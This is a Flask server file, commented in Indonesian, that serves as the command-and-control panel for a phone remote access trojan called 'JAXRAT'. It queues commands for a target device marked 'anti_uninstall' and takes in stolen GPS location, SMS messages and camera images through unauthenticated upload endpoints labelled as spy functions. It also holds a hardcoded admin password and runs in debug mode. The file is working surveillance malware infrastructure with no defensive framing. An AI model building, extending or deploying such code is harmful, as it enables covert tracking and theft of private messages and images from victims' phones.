from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'jaxrat_secret_key_v1_sangat_rahasia'

USERNAME = "admin"
PASSWORD = "jaxrat123"

devices = {
    "hp_target_1": {"___name": "HP Target", "status": "online", "last_seen": "-", "anti_uninstall": True}
}

latest_commands = {"hp_target_1": "none"}

# PENAMPUNG DATA SPY (In-Memory)
latest_results = {
    "hp_target_1": {
        "gps": "Belum ada data",
        "sms": []
    }
}

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == USERNAME and request.form['password'] == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return render_template('login.html', error="Akses Ditolak!")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
def index():
    if not session.get('logged_in'): return redirect(url_for('login'))
    return render_template('index.html', devices=devices)

@app.route('/device/<device_id>')
def device_panel(device_id):
    if not session.get('logged_in'): return redirect(url_for('login'))
    if device_id not in devices: return "Perangkat tidak ditemukan", 404
    return render_template('panel.html', device_id=device_id, device=devices[device_id])

# --- ENDPOINT KONTROL ---
@app.route('/api/command/<device_id>', methods=['POST'])
def receive_command(device_id):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
    data = request.json
    cmd = data.get("command")
    latest_commands[device_id] = cmd
    print(f"[JAXRAT] Perintah masuk untuk {device_id}: {cmd}")
    return jsonify({"status": "success", "received": cmd})

@app.route('/api/get_command/<device_id>', methods=['GET'])
def get_command(device_id):
    cmd = latest_commands.get(device_id, "none")
    latest_commands[device_id] = "none"
    return jsonify({"command": cmd})

# --- ENDPOINT SPY (TERIMA DATA DARI HP) ---
@app.route('/api/upload_result/<device_id>', methods=['POST'])
def upload_result(device_id):
    data = request.json
    if device_id in latest_results:
        if data.get("type") == "gps":
            latest_results[device_id]["gps"] = data.get("data")
            print(f"[SPY] GPS masuk dari {device_id}: {data.get('data')}")
        elif data.get("type") == "sms":
            latest_results[device_id]["sms"] = data.get("data")
            print(f"[SPY] {len(data.get('data'))} SMS masuk dari {device_id}")
    return jsonify({"status": "success"})

# --- ENDPOINT SPY (WEB AMBIL DATA) ---
@app.route('/api/get_results/<device_id>', methods=['GET'])
def get_results(device_id):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
    return jsonify(latest_results.get(device_id, {}))

@app.route('/api/clear_result/<device_id>/<result_type>', methods=['POST'])
def clear_result(device_id, result_type):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
    if device_id in latest_results:
        if result_type == "gps":
            latest_results[device_id]["gps"] = "Belum ada data"
        elif result_type == "sms":
            latest_results[device_id]["sms"] = []
    return jsonify({"status": "success"})
import os
from werkzeug.utils import secure_filename
from flask import send_from_directory

# Bikin folder uploads kalau belum ada
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/api/upload_image/<device_id>', methods=['POST'])
def upload_image(device_id):
    if 'image' not in request.files:
        return jsonify({"status": "error", "message": "No image part"}), 400
    
    file = request.files['image']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400
    
    # Simpan sebagai latest.jpg (nimpa file lama biar hemat storage)
    filepath = os.path.join(UPLOAD_FOLDER, 'latest.jpg')
    file.save(filepath)
    print(f"[SPY] Gambar baru diterima dari {device_id}!")
    
    return jsonify({"status": "success"})
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
